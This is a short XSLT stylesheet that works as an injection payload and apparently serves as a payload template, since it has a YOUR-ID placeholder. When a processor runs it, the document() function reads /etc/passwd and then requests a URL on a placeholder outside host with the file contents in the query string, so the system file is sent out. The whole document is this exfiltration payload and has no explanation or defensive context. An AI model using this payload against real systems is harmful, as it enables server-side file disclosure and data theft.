<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="data" select="document('file:///etc/passwd')" />
    <xsl:variable name="exfil" select="concat('https://e9819ff5-8aeb-4e28-bed0-c84c9ce8d1a3/YOUR-ID?data=', $data)" />
    <xsl:value-of select="document($exfil)" />
  </xsl:template>
</xsl:stylesheet>
